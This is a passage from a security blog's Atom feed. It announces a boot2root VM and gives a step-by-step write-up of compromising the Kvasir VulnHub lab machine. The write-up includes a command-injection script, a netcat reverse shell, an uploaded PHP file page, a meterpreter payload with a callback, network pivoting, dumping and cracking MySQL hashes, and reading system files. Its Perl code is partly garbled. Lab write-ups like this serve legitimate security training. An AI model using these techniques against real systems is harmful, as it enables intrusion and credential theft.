@@ -1,0 +1,3484 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Vulnhub | Knapsy's brain dump]]></title>
+  <link href="http://knapsy.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
+  <link href="http://knapsy.github.io/"/>
+  <updated>2015-04-03T18:03:16+11:00</updated>
+  <id>http://knapsy.github.io/</id>
+  <author>
+    <name><![CDATA[Knapsy]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pegasus Has Arrived - My First Boot2root VM]]></title>
+    <link href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/"/>
+    <updated>2014-12-16T21:54:34+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm</id>
+    <content type="html"><![CDATA[<p>It&rsquo;s here! My first boot2root VM, inspired by various CTFs I attended this year and couple cool things I learnt, is finally here! Go and grab it from <a href="https://www.vulnhub.com/entry/pegasus-1,109/">here (via VulnHub)</a>.</p>
+
+<!-- more -->
+
+
+<h2>Overview</h2>
+
+<p>Without giving out too much, I tried to design it the way it will exercise your patience and force you to think outside the box. Sometimes the obvious is not the right solution and sometimes the fundamentals and creativity pay off.</p>
+
+<p>Huge thanks to <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> for hosting the VM and a massive shoutout to <a href="https://twitter.com/iMulitia">mulitia</a> for beta-testing it!</p>
+
+<p>Why the name? No particular reason&hellip; seemes like some of the VMs at <a href="https://www.vulnhub.com/">VulnHub</a> got their names from mythology, so just jumped on the bandwagon :)</p>
+
+<p>Feel free to hit me up with some feedback, I&rsquo;d love to hear from you!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Kvasir VM Writeup]]></title>
+    <link href="http://knapsy.github.io/blog/2014/11/05/kvasir-vm-writeup/"/>
+    <updated>2014-11-05T19:30:38+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/11/05/kvasir-vm-writeup</id>
+    <content type="html"><![CDATA[<p>It sort of became the main theme of this blog&hellip; yet another writeup for a VM from <a href="http://vulnhub.com">VulnHub</a> and, I have to admit, probably the most demanding one yet!</p>
+
+<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a> touches on quite a lot of aspects of security/pentesting and really tests your patience. <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a> did a great job putting it all together and simulating a network of quite some depth by using Linux containers.</p>
+
+<p>So, without delying too much, let&rsquo;s get right into it as there&rsquo;s A LOT to go through!</p>
+
+<!-- more -->
+
+
+<h2>Preface</h2>
+
+<p>Since it&rsquo;s quite lengthy VM, I&rsquo;ll skip describing thousands of failed attempts and other ideas that I had and thought <em>should have</em> worked.</p>
+
+<p>Instead, I will jump straight to the essence, but, in some cases, I&rsquo;ll mention what is also worth trying if you find yourself in similar situations (but didn&rsquo;t work with this challenge).</p>
+
+<h2>Recon</h2>
+
+<p>You know the drill, boot up the VM, wait a little bit for containers to kick-in and use <code>netdiscover</code> to find its IP address.</p>
+
+<pre><code>root@kali:~# netdiscover -r 172.16.246.0/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                 
+ 172.16.246.134  00:0c:29:a8:5e:9e    01    060   VMware, Inc.                 
+ 172.16.246.254  00:50:56:f1:3e:b4    01    060   VMWare, Inc.                 
+</code></pre>
+
+<p>And <code>nmap</code> to find what ports are open.</p>
+
+<pre><code>root@kali:~# nmap -sV 172.16.246.134
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-11-05 19:42 EST
+Nmap scan report for 172.16.246.134
+Host is up (0.00032s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+MAC Address: 00:0C:29:A8:5E:9E (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+</code></pre>
+
+<h2>No redirect and command injection</h2>
+
+<p>Let&rsquo;s have a look at that webserver.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/login.png" title="Login" alt="Login" /></p>
+
+<p>We have a simple login form, first thing I usually try is bypassing this with some standard SQL injection <code>' or '1'='1' --</code> in both login and password fields. Unfortunately this didn&rsquo;t work here.</p>
+
+<p>Let&rsquo;s create a new user and see what else can we access.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/welcome.png" title="Welcome" alt="Welcome" /></p>
+
+<p>Hmm, not much of a useful stuff. Generally, you would want to keep an eye on and play with:</p>
+
+<ul>
+<li>cookies</li>
+<li>XXS - not very useful here as there are no users to attack</li>
+<li>SQL injection on any of the input fields / URL parameters</li>
+</ul>
+
+
+<p>But none of the above worked. So let&rsquo;s open up <code>dirbuster</code> and see are there any other pages that we can&rsquo;t access at the moment&hellip;</p>
+
+<pre><code>root@kali:~# dirbuster
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+File found: /index.php - 200
+Dir found: / - 200
+Dir found: /cgi-bin/ - 403
+File found: /login.php - 302
+File found: /register.php - 200
+File found: /submit.php - 200
+File found: /admin.php - 302
+File found: /member.php - 302
+...
+</code></pre>
+
+<p>Straight away <code>admin.php</code> stands out - looks interesting&hellip; and when trying to access it, we get a redirect to member.php! Cool, let&rsquo;s use <code>burp</code> and avoid redirection.</p>
+
+<p>I&rsquo;m using <code>FoxyProxy</code> to ensure my browser is using proxy I specify (in this case, <code>burp</code>). Set it up and type in <code>http://172.16.246.134/admin.php</code> in the address bar.</p>
+
+<p>Go to Proxy -> Intercept and Burp and set it to intercept response.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/intercept_response.png" title="Intercept Response" alt="Intercept Response" /></p>
+
+<p>Forward the request and you&rsquo;ll see the response.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/response.png" title="Response" alt="Response" /></p>
+
+<p>Let&rsquo;s modify the header from <code>HTTP/1.1 302 FOUND</code> to <code>HTTP/1.1 200</code> (bypassing redirection) and forward the packet. Look what we can see in the browser now!</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/service_check.png" title="Service Check" alt="Service Check" /></p>
+
+<p>Awesome! Let&rsquo;s type in what&rsquo;s suggested - apache2 and see what happens. Since we still have <code>burp</code> running, we&rsquo;ll go through the same steps of modifying the request and response as above, otherwise, we&rsquo;ll be redirected back to <code>member.php</code> page.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/apache_running.png" title="Apache Running" alt="Apache Running" /></p>
+
+<p>It&rsquo;s just asking for command injection! But since doing it all through <code>burp</code> would be a bit of a pain, I&rsquo;ve crafted a simple script to do it all for me.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="o">!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="sr">/perl&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="nv">$url</span><span class="o">=&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://172.16.246.134/admin.php&quot;</span><span class="o">&gt;</span><span class="n">http:</span><span class="sr">//</span><span class="mf">172.16.246.134</span><span class="sr">/admin.php&lt;/</span><span class="n">a</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;;</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">use</span> <span class="n">LWP</span><span class="p">;</span>
+</span><span class='line'><span class="k">use</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;HTTP::Request::Common;&quot;</span><span class="o">&gt;</span><span class="nn">HTTP::Request::</span><span class="n">Common</span><span class="p">;</span><span class="sr">&lt;/a&gt;</span>
+</span><span class='line'><span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nn">LWP::</span><span class="n">UserAgent</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;;</span>
+</span><span class='line'><span class="nv">$res</span> <span class="o">=</span> <span class="nv">$ua</span><span class="o">-&gt;</span><span class="n">request</span><span class="p">(</span><span class="n">POST</span> <span class="nv">$url</span><span class="p">,</span>
+</span><span class='line'><span class="n">Content_Type</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="n">Content</span> <span class="o">=&gt;</span> <span class="p">[</span>
+</span><span class='line'><span class="n">service</span> <span class="o">=&gt;</span> <span class="nv">$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span><span class='line'><span class="n">submit</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Submit</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
+</span><span class='line'><span class="p">],);</span><span class="sr">&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;</span><span class="n">Print</span> <span class="n">response</span><span class="sr">&lt;/h1&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;p&gt;</span><span class="k">print</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="n">as_string</span><span class="p">();</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now I can pass in whatever I want to send through the <code>admin.php</code> page as a command line argument to the script.</p>
+
+<p>Initially I tried <code>./send_form.pl "apache2; id"</code>, but it didn&rsquo;t work, let&rsquo;s try a variation of it with <code>#</code> at the end.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ./send_form.pl &ldquo;apache2; id #&rdquo;
+</span><span class='line'>HTTP/1.1 302 Found
+</span><span class='line'>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+</span><span class='line'>Connection: close
+</span><span class='line'>Date: Tue, 04 Nov 2014 19:46:00 GMT
+</span><span class='line'>Pragma: no-cache
+</span><span class='line'>Location: index.php
+</span><span class='line'>Server: Apache/2.2.22 (Debian)
+</span><span class='line'>Vary: Accept-Encoding
+</span><span class='line'>Content-Length: 546
+</span><span class='line'>Content-Type: text/html
+</span><span class='line'>Expires: Thu, 19 Nov 1981 08:52:00 GMT
+</span><span class='line'>Client-Date: Wed, 05 Nov 2014 09:40:50 GMT
+</span><span class='line'>Client-Peer: 172.16.246.134:80
+</span><span class='line'>Client-Response-Num: 1
+</span><span class='line'>Set-Cookie: PHPSESSID=vsur3uar3fopv27r8rtfk5dmd2; path=/
+</span><span class='line'>X-Powered-By: PHP/5.4.4-14+deb7u11&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;html>
+</span><span class='line'>&lt;body>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;div align="center">&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;h1>Service Check&lt;/h1>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;form name="service" method="post" action="">
+</span><span class='line'>&lt;input name="service" id="service" type="text" placeholder="apache2" />&lt;br />&lt;br />
+</span><span class='line'>&lt;input name="submit" id="submit" type="submit" value="Submit" />
+</span><span class='line'>&lt;/form>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;form action="logout.php" method="post">
+</span><span class='line'>&lt;input type="submit" value="Logout" />
+</span><span class='line'>&lt;/form>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&lt;pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>&lt;/pre></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Awesome, confirmed command injection! Conviniently, there&rsquo;s <code>netcat</code> available as well, so let&rsquo;s take advantage of it!</p>
+
+<p>Set up listener locally.</p>
+
+<pre><code>root@kali:~# nc -l -p 31337
+</code></pre>
+
+<p>And use the command injection vulnerability to connect back with a shell.</p>
+
+<pre><code>root@kali:~# ./send_form.pl "apache2; netcat -e /bin/bash 172.16.246.129 31337"
+</code></pre>
+
+<pre><code>root@kali:~# nc -l -p 31337
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>Woohoo, we&rsquo;re in!</p>
+
+<h2>MySQL and enabling UDF</h2>
+
+<p>Doing a bit of a recon on the box, we can quickly find out by looking at the <code>submit.php</code> file that there&rsquo;s a MySQL database listening on 192.168.2.200 with credentials <code>webapp:webapp</code>.</p>
+
+<p>Okay, looks like this host is dual-homed! We&rsquo;ll need to jump on 192.168.2.0 subnet (and eventually, further). Also, we have non-TTY shell, so it&rsquo;s a bit of a pain&hellip;</p>
+
+<p>To overcome this, I came up with an idea to use <code>metasploit</code> pivoting capability, SOCKS proxy server and <code>proxychains</code> to connect to MySQL database directly from my host.</p>
+
+<p>First, I need to generate and get metasploit payload on the server, but how? I came up with another idea&hellip; but thinking about it now, there are probably number of other, better and easier methods. Oh well, that&rsquo;s the first one I went ahead with, so I&rsquo;ll stick to it with this writeup.</p>
+
+<p>I&rsquo;ll create a new php upload page and get my files on that server this way!</p>
+
+<pre><code>echo "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=upload.php method=post enctype=multipart/form-data&gt;&lt;input type=file name=uploadFile&gt;&lt;br&gt;&lt;input type=submit value=Upload File&gt;&lt;/form&gt;" &gt; upload.php
+echo "&lt;?php" &gt;&gt; upload.php
+echo "\$target_dir = \"uploads/\";" &gt;&gt; upload.php
+echo "\$target_dir = \$target_dir . basename( \$_FILES[\"uploadFile\"][\"name\"]);" &gt;&gt; upload.php
+echo "if (move_uploaded_file(\$_FILES[\"uploadFile\"][\"tmp_name\"], \$target_dir)) {" &gt;&gt; upload.php
+echo "echo \"The file \". basename( \$_FILES[\"uploadFile\"][\"name\"]). \" has been uploaded.\";" &gt;&gt; upload.php
+echo "} else {" &gt;&gt; upload.php
+echo "echo \"Sorry, there was an error uploading your file.\";" &gt;&gt; upload.php
+echo "}?&gt;&lt;/body&gt;&lt;/html&gt;" &gt;&gt; upload.php
+</code></pre>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/upload.png" title="Upload" alt="Upload" /></p>
+
+<p>Generate metasploit payload and upload it to the server using newly created page.</p>
+
+<pre><code>msf &gt; use payload/linux/x86/meterpreter/reverse_tcp 
+msf payload(reverse_tcp) &gt; show options
+
+Module options (payload/linux/x86/meterpreter/reverse_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   DebugOptions  0                no        Debugging options for POSIX meterpreter
+   LHOST                          yes       The listen address
+   LPORT         4444             yes       The listen port
+
+msf payload(reverse_tcp) &gt; set LHOST 172.16.246.129
+LHOST =&gt; 172.16.246.129
+msf payload(reverse_tcp) &gt; generate -t elf -f exploit
+[*] Writing 155 bytes to exploit...
+</code></pre>
+
+<p>Set-up metasploit multi handler and run the exploit.</p>
+
+<pre><code>msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp 
+PAYLOAD =&gt; linux/x86/meterpreter/reverse_tcp
+msf exploit(handler) &gt; show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   DebugOptions  0                no        Debugging options for POSIX meterpreter
+   LHOST         172.16.246.129   yes       The listen address
+   LPORT         4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(handler) &gt; exploit -j
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 172.16.246.129:4444 
+[*] Starting the payload handler...
+</code></pre>
+
+<pre><code>root@kali:~# nc -l -p 31337
+ls
+admin.php
+index.php
+login.php
+logout.php
+member.php
+register.php
+submit.php
+upload.php
+uploads
+
+
+cd uploads
+./exploit &amp;
+</code></pre>
+
+<pre><code>msf exploit(handler) &gt; [*] Transmitting intermediate stager for over-sized stage...(100 bytes)
+[*] Sending stage (1138688 bytes) to 172.16.246.134
+[*] Meterpreter session 5 opened (172.16.246.129:4444 -&gt; 172.16.246.134:55877) at 2014-11-05 21:24:03 +1100
+</code></pre>
+
+<p>Woop, woop, we got meterpreter shell! <a href="http://i.imgur.com/hV9YDNn.gif">Meterpreter dance</a></p>
+
+<p>Let&rsquo;s configure a pivot and start socks server in metasploit and configure proxychains.</p>
+
+<pre><code>msf exploit(handler) &gt; route add 192.168.2.0 255.255.255.0 5
+[*] Route added
+msf exploit(handler) &gt; route print
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.168.2.0        255.255.255.0      Session 5
+
+msf exploit(handler) &gt; back
+msf &gt; use auxiliary/server/socks
+use auxiliary/server/socks4a    use auxiliary/server/socks_unc
+msf &gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &gt; show options
+
+Module options (auxiliary/server/socks4a):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+
+msf auxiliary(socks4a) &gt; run
+[*] Auxiliary module execution completed
+
+[*] Starting the socks4a proxy server
+[*] Stopping the socks4a proxy server
+msf auxiliary(socks4a) &gt; jobs
+</code></pre>
+
+<p>Make sure to add the following lines in <code>/etc/proxychains.conf</code></p>
+
+<pre><code># MetaSploit
+socks4 127.0.0.1 1080
+</code></pre>
+
+<p>Now we can run any command on our local Kali with <code>proxychains</code> in front of it and it&rsquo;ll talk directly to anything on 192.168.2.0 subnet!</p>
+
+<p>Let&rsquo;s connect to the MySQL server and loot as much as we can.</p>
+
+<pre><code>root@kali:~# proxychains mysql -h 192.168.2.200 -u webapp -p
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 67
+Server version: 5.5.37-0+wheezy1 (Debian)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| webapp             |
++--------------------+
+4 rows in set (0.09 sec)
+
+mysql&gt; use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+24 rows in set (0.01 sec)
+
+mysql&gt; select User, Password from user;
++------------------+-------------------------------------------+
+| User             | Password                                  |
++------------------+-------------------------------------------+
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
+| debian-sys-maint | *E0E0871376896664A590151D348CCE9AA800435B |
+| webapp           | *BF7C27E734F86F28A9386E9759D238AFB863BDE3 |
+| root             | *ECB01D78C2FBEE997EDA584C647183FD99C115FD |
++------------------+-------------------------------------------+
+7 rows in set (0.01 sec)
+
+mysql&gt; use webapp;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++------------------+
+| Tables_in_webapp |
++------------------+
+| todo             |
+| users            |
++------------------+
+2 rows in set (0.06 sec)
+
+mysql&gt; select * from todo;
++----------------------------+
+| task                       |
++----------------------------+
+| stop running mysql as root |
++----------------------------+
+1 row in set (0.04 sec)
+</code></pre>
+
+<p>Some useful piece of information. We have database running as root user on the server and we looted root password to the database that we cracked via <a href="https://crackstation.net/">CrackStation</a>.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/crackstation.png" title="Crack Station" alt="CrackStation" /></p>
+
+<p>Let&rsquo;s log-in with <code>root:coolwater</code> and see how we can break out to system shell.</p>
+
+<pre><code>root@kali:~# proxychains mysql -h 192.168.2.200 -u root -p
+ProxyChains-3.1 (http://proxychains.sf.net)
+Enter password: 
+|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.200:3306-&lt;&gt;&lt;&gt;-OK
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 68
+Server version: 5.5.37-0+wheezy1 (Debian)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; use webapp
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</code></pre>
+
+<p>There are couple cool things that we can do:</p>
+
+<ul>
+<li>reading any file on the system</li>
+</ul>
+
+
+<pre><code>mysql&gt; create table pwn(test text);
+Query OK, 0 rows affected (0.04 sec)
+
+mysql&gt; load data infile '/etc/passwd' into table pwn;
+Query OK, 22 rows affected (0.01 sec)
+Records: 22  Deleted: 0  Skipped: 0  Warnings: 0
+
+mysql&gt; select * from pwn;
++-------------------------------------------------------------------------+
+| test                                                                    |
++-------------------------------------------------------------------------+
+| root:x:0:0:root:/root:/bin/bash                                         |
+| daemon:x:1:1:daemon:/usr/sbin:/bin/sh                                   |
+| bin:x:2:2:bin:/bin:/bin/sh                                              |
+| sys:x:3:3:sys:/dev:/bin/sh                                              |
+| sync:x:4:65534:sync:/bin:/bin/sync                                      |
+| games:x:5:60:games:/usr/games:/bin/sh                                   |
+| man:x:6:12:man:/var/cache/man:/bin/sh                                   |
+| lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                      |
+| mail:x:8:8:mail:/var/mail:/bin/sh                                       |
+| news:x:9:9:news:/var/spool/news:/bin/sh                                 |
+| uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                               |
+| proxy:x:13:13:proxy:/bin:/bin/sh                                        |
+| www-data:x:33:33:www-data:/var/www:/bin/sh                              |
+| backup:x:34:34:backup:/var/backups:/bin/sh                              |
+| list:x:38:38:Mailing List Manager:/var/list:/bin/sh                     |
+| irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                  |
+| gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh |
+| nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                        |
+| libuuid:x:100:101::/var/lib/libuuid:/bin/sh                             |
+| sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin                       |
+| mysql:x:102:103:MySQL Server,,,:/nonexistent:/bin/false                 |
+| ftpuser:x:1000:1000::/dev/null:/etc/                                    |
++-------------------------------------------------------------------------+
+22 rows in set (0.02 sec)
+</code></pre>
+
+<ul>
+<li>create a file on the system (as long as it doesn&rsquo;t exist yet, you can&rsquo;t modify/write to existing files)</li>
+</ul>
+
+
+<pre><code>mysql&gt; insert into pwn(test) values("here is some text");
+Query OK, 1 row affected (0.07 sec)
+
+mysql&gt; select * from pwn into dumpfile '/tmp/pwn';
+Query OK, 0 rows affected (0.10 sec)
+</code></pre>
+
+<p>However, this doesn&rsquo;t give us much, no interesting files to read and I tried creating SSH keys, however, MySQL sets permissions of files it creates to 660, which is not restrictive enough for SSH keys to work.</p>
+
+<p>Last resort - UDF functions! But&hellip; there&rsquo;s a problem, it&rsquo;s not installed! But that&rsquo;s OK, there&rsquo;s a trick to install it ourselves.</p>
+
+<p>Couple things we&rsquo;ll need to do:</p>
+
+<ul>
+<li>define base64 decoding functions (we need to somehow get actual libraries over onto the server)</li>
+</ul>
+
+
+<pre><code>-- base64.sql - MySQL base64 encoding/decoding functions
+-- Copyright (C) 2006 Ian Gulliver
+-- 
+-- This program is free software; you can redistribute it and/or modify
+-- it under the terms of version 2 of the GNU General Public License as
+-- published by the Free Software Foundation.
+-- 
+-- This program is distributed in the hope that it will be useful,
+-- but WITHOUT ANY WARRANTY; without even the implied warranty of
+-- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+-- GNU General Public License for more details.
+-- 
+-- You should have received a copy of the GNU General Public License
+-- along with this program; if not, write to the Free Software
+-- Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
+
+delimiter |
+
+DROP TABLE IF EXISTS base64_data |
+CREATE TABLE base64_data (c CHAR(1) BINARY, val TINYINT) |
+INSERT INTO base64_data VALUES 
+('A',0), ('B',1), ('C',2), ('D',3), ('E',4), ('F',5), ('G',6), ('H',7), ('I',8), ('J',9),
+('K',10), ('L',11), ('M',12), ('N',13), ('O',14), ('P',15), ('Q',16), ('R',17), ('S',18), ('T',19),
+('U',20), ('V',21), ('W',22), ('X',23), ('Y',24), ('Z',25), ('a',26), ('b',27), ('c',28), ('d',29),
+('e',30), ('f',31), ('g',32), ('h',33), ('i',34), ('j',35), ('k',36), ('l',37), ('m',38), ('n',39),
+('o',40), ('p',41), ('q',42), ('r',43), ('s',44), ('t',45), ('u',46), ('v',47), ('w',48), ('x',49),
+('y',50), ('z',51), ('0',52), ('1',53), ('2',54), ('3',55), ('4',56), ('5',57), ('6',58), ('7',59),
+('8',60), ('9',61), ('+',62), ('/',63), ('=',0) |
+
+
+DROP FUNCTION IF EXISTS BASE64_DECODE |
+CREATE FUNCTION BASE64_DECODE (input BLOB)
+RETURNS BLOB
+CONTAINS SQL
+DETERMINISTIC
+SQL SECURITY INVOKER
+BEGIN
+DECLARE ret BLOB DEFAULT '';
+DECLARE done TINYINT DEFAULT 0;
+
+IF input IS NULL THEN
+RETURN NULL;
+END IF;
+
+each_block:
+WHILE NOT done DO BEGIN
+DECLARE accum_value BIGINT UNSIGNED DEFAULT 0;
+DECLARE in_count TINYINT DEFAULT 0;
+DECLARE out_count TINYINT DEFAULT 3;
+
+each_input_char:
+WHILE in_count &lt; 4 DO BEGIN
+DECLARE first_char CHAR(1);
+
+IF LENGTH(input) = 0 THEN
